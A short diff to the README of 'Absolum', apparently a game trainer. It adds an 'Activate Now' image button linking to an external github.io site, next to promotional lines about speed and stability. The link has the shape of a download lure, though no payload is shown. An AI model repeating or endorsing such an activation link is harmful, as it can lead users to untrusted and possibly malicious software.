@@ -4,6 +4,8 @@
 
 Perfect for both casual and competitive sessions, Absolum ensures consistent execution speed and rock-solid system stability.
 
+[![Activate Now](https://github.com/hawk-1983/hawk-1983/blob/main/img.png?raw=true)](https://absolum-trainer.github.io/.github/)
+
 ---
 
 ### ⚡ Overview
